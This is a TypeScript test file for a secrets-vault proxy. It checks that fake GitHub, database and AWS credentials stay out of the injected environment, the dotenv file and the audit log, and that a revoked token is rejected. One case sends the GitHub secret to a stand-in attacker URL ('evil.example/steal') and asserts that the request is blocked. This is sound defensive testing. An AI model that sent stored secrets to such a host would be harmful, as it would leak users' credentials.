import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { configureAuditPath, readAuditEntries } from "../audit";
import { renderWorkspaceEnv, vaultProxyEnv } from "./inject";
import { proxyVaultRequest, type FetchFn } from "./proxy";
import { putSecret } from "./registry";
import { clearRevokedVaultTokens, revokeVaultToken } from "./token";

const FAKE_GITHUB = "ghp_FAKE_NOT_A_REAL_TOKEN_000";
const FAKE_DB = "postgres://user:fake-password-not-real@db.example.test:5432/app";
const FAKE_AWS_SECRET = "fake-aws-secret-not-real-000";

function envFor(): Record<string, string | undefined> {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "vault-"));
  return {
    SWARM_HOME: home,
    SWARM_KEYS_SECRET: "k".repeat(40),
    SWARM_SESSION_SECRET: "s".repeat(40),
  };
}

test("real credentials never appear in the VM env, dotenv, or audit log", async () => {
  const env = envFor();
  const auditFile = path.join(env.SWARM_HOME!, "audit.jsonl");
  configureAuditPath(auditFile);
  clearRevokedVaultTokens();
  putSecret("user-a", { id: "gh", kind: "github", label: "gh", plaintext: FAKE_GITHUB }, env);
  putSecret("user-a", { id: "db", kind: "database", label: "db", plaintext: FAKE_DB }, env);
  putSecret(
    "user-a",
    {
      id: "aws",
      kind: "aws",
      label: "aws",
      plaintext: JSON.stringify({ accessKeyId: "AKIAFAKE000000000", secretAccessKey: FAKE_AWS_SECRET }),
    },
    env,
  );

  const injected = vaultProxyEnv("user-a", "run-1", "http://host.internal", env);
  const dotenv = renderWorkspaceEnv(injected);
  const workspace = path.join(env.SWARM_HOME!, "workspace.env");
  fs.writeFileSync(workspace, dotenv);

  let upstreamAuth = "";
  const fetchImpl: FetchFn = async (_url, init) => {
    upstreamAuth = init.headers.authorization ?? "";
    return {
      status: 200,
      text: async () => "{\"login\":\"octocat\"}",
      headers: { get: (name) => (name === "content-type" ? "application/json" : null) },
    };
  };
  const result = await proxyVaultRequest(
    {
      token: injected.SWARM_VAULT_TOKEN,
      secretId: "gh",
      url: "https://api.github.com/user",
    },
    { fetchImpl, env },
  );
  assert.equal(result.status, 200);
  assert.equal(upstreamAuth, `Bearer ${FAKE_GITHUB}`);

  const denied = await proxyVaultRequest(
    {
      token: injected.SWARM_VAULT_TOKEN,
      secretId: "gh",
      url: "https://evil.example/steal",
    },
    { fetchImpl, env },
  );
  assert.equal(denied.status, 403);

  const db = await proxyVaultRequest(
    {
      token: injected.SWARM_VAULT_TOKEN,
      secretId: "db",
      url: "https://db.example.test/",
    },
    { fetchImpl, env },
  );
  assert.equal(db.status, 403);

  const logs = [
    dotenv,
    fs.readFileSync(workspace, "utf8"),
    JSON.stringify(injected),
    JSON.stringify(result),
    fs.readFileSync(auditFile, "utf8"),
  ].join("\n");
  assert.equal(logs.includes(FAKE_GITHUB), false);
  assert.equal(logs.includes(FAKE_DB), false);
  assert.equal(logs.includes("fake-password-not-real"), false);
  assert.equal(logs.includes(FAKE_AWS_SECRET), false);
  assert.equal(injected.DATABASE_URL, "vault://db");
  assert.equal(injected.GITHUB_TOKEN, injected.SWARM_VAULT_TOKEN);
  const entries = readAuditEntries("user-a");
  assert.ok(entries.some((e) => e.action === "vault.proxy" && e.target.includes("api.github.com")));

  revokeVaultToken("run-1");
  const dead = await proxyVaultRequest(
    { token: injected.SWARM_VAULT_TOKEN, secretId: "gh", url: "https://api.github.com/user" },
    { fetchImpl, env },
  );
  assert.equal(dead.status, 401);
  configureAuditPath(undefined);
});
